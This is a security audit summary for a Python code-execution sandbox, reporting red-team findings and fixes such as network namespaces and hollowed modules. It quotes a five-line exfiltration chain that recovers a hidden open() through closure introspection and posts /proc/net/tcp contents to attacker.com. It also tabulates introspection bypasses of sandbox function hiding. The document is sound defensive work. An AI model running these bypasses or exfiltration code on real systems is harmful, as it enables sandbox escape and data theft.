# Security Recommendations — Red Team Rounds 1-11

**Source:** SECURITY_AUDIT.md (37 findings across 11 rounds)
**Date:** 2026-03-09
**Auditor:** Claude Opus 4.6 (automated red-team via MCP tools)

---

## Executive Summary

After 11 rounds of red-team testing, the sandbox has strong process isolation (nsjail + seccomp) but **Python-level function hiding is fundamentally broken** and cannot be fixed. Three different hiding strategies were tried across R8-R11 — all bypassed in minutes:

| Round | Strategy | Bypass | Time to Break |
|-------|----------|--------|---------------|
| R8-R9 | `__slots__ = ('_f',)` + `__getattribute__` override | `object.__getattribute__(instance, '_f')` | Minutes |
| R10 | Closure-based function wrappers | `func.__closure__[0].cell_contents` | Minutes |
| R11 | Empty `__slots__`, real fn in `__call__` method closure | `type(obj).__dict__['__call__'].__closure__[N]` | Minutes |

**The current exfiltration chain (F-37 + F-16) is 5 lines of pure Python:**
```python
import builtins, urllib.request, json
real_open = type(builtins.open).__dict__['__call__'].__closure__[0].cell_contents
with real_open('/proc/net/tcp') as f: tcp = f.read()
payload = json.dumps({"data": tcp}).encode()
urllib.request.urlopen(urllib.request.Request('https://attacker.com/collect', data=payload))
```

Since outbound internet is **by design** for paid tiers, the fix is to **reduce what can be read**, not block what can be sent.

---

## ~~Priority 1: Bind-Mount Empty Files Over Sensitive /proc Entries~~ FIXED

**Status: RESOLVED by P2 (clone_newnet)**

nsjail's `remountPt()` rejects bind-mounts on procfs subdirectories (`/proc/net/*`, `/proc/self/*`).
This was the reason P1 couldn't be implemented standalone. P2 (clone_newnet) resolves it:
each sandbox gets its own network namespace where `/proc/net` shows only sandbox connections.

---

## ~~Priority 2: clone_newnet with MACVLAN~~ IMPLEMENTED

**Status: IMPLEMENTED**

`clone_newnet: true` in nsjail config gives each sandbox its own network namespace:

- **Free tier:** Empty network namespace = zero connectivity (no MACVLAN)
- **Paid tiers:** MACVLAN on container's eth0 with unique IP per execution (10.200.X.Y)
- `/proc/net/tcp` shows only sandbox's own connections (not host)
- `/proc/net/arp` is empty (no Docker containers visible)
- Port hijacking impossible (sandbox can't bind to host ports)
- MACVLAN parent-child isolation: sandbox can't reach container's own IP

**Files changed:**
- `deploy/nsjail/python.cfg` — `clone_newnet: true`
- `deploy/nsjail/spawn-sandbox.sh` — MACVLAN args for paid tiers, unified UID 65534
- `scripts/start.sh` — removed UID-based iptables (replaced by network namespaces)
- `scripts/setup-sandbox-network.sh` — host-level iptables for MACVLAN subnet (10.200.0.0/16)

---

## ~~Priority 3: Hollow _posixsubprocess .so~~ FIXED

**Status: RESOLVED** — `_posixsubprocess` .so is bind-mounted to empty file in `spawn-sandbox.sh` (alongside `_ctypes`).

---

## ~~Priority 4: Reserved Namespace List (F-06)~~ FIXED

**Status: RESOLVED** — Reserved namespace list implemented. Squatted namespaces (`admin`, `api`, `internal`, `www`) hard-deleted via admin endpoint.

---

## ~~Priority 5: Stored XSS Fix (F-01)~~ FIXED

**Status: RESOLVED** — Server-side HTML sanitization applied at registration endpoint. Admin panel removed (R7).

---

## What NOT to Do

### Stop iterating on Python-level function hiding

Three attempts, three bypasses. CPython's object model makes ALL of these introspectable:
- Instance attributes (`__slots__`, `__dict__`)
- Closure cells (`__closure__[N].cell_contents`)
- Method closures (`type(obj).__dict__['__call__'].__closure__`)
- Class descriptors (`type.__dict__['attr'].__get__(instance)`)
- Module globals (`func.__globals__`)

**There is no fourth place to hide a function reference in CPython.** Every Python object's internals are accessible by design. This is a language-level guarantee, not a bug.

Keep `_harden_sandbox()` for casual deterrence (it stops naive attempts), but do not invest further engineering time trying to make it bypass-proof. The security boundary is nsjail + seccomp + filesystem controls.

---

## Current Scorecard

| Category | Status |
|----------|--------|
| Process isolation (nsjail) | Strong |
| Syscall filtering (seccomp) | Strong — execve, fork, listen, mmap(EXEC) blocked |
| Shell access | Fully blocked (R9) |
| Internal service access | Fully blocked (firewall) |
| Outbound internet | Open by design (paid tiers) |
| /proc information leakage | **Fixed — clone_newnet isolates /proc/net** |
| Python-level hardening | Ineffective (3 iterations bypassed) |
| Stored XSS | Fixed (server-side sanitization) |
| Namespace squatting | Fixed (reserved list + cleanup) |

**22 findings fixed, 0 critical open (F-16 accepted risk, Python hardening = deterrence only)**

Full details: [SECURITY_AUDIT.md](SECURITY_AUDIT.md) | Test log: [MCP_SECURITY_AUDIT.md](MCP_SECURITY_AUDIT.md)
